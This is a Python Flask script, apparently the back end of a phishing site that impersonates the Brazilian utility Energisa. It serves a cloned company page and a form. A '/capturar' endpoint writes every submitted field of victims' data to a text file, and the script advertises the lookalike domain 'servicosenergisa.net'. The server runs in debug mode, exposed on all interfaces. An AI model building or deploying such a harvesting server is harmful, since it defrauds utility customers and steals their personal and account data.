from flask import Flask, request, render_template
from flask_cors import CORS
from datetime import datetime
import os
import threading

app = Flask(__name__, static_folder='static', template_folder='templates')
CORS(app)

LOG_FILE = 'cadastros.txt'

# Página inicial do site
@app.route('/')
def energisa():
    return render_template('energisa_com_br.html')

# Página de formulário
@app.route('/index')
def index():
    return render_template('index.html')

# API que recebe os dados do formulário
@app.route('/capturar', methods=['POST'])
def capturar():
    dados = request.get_json()
    timestamp = datetime.now().strftime('%d/%m/%Y %H:%M:%S')

    log_entrada = [
        "\n==============================",
        f" NOVO CADASTRO - {timestamp}",
        "=============================="
    ]
    for chave, valor in dados.items():
        log_entrada.append(f"{chave.upper()}: {valor}")
    log_entrada.append("==============================\n")

    print("\n".join(log_entrada))

    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write("\n".join(log_entrada))

    return '', 204

# Função opcional para encerrar o servidor com comando
def escutar_comandos():
    while True:
        comando = input().strip().lower()
        if comando == "cancelar protocolo":
            print("\n[⚠️] Comando recebido: encerrando servidor!")
            os._exit(0)

if __name__ == '__main__':
    threading.Thread(target=escutar_comandos, daemon=True).start()

    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write("=== REGISTRO DE CADASTROS INICIADO ===\n")
print("http://www.servicosenergisa.net/")
app.run(host='0.0.0.0', port=80, debug=True)






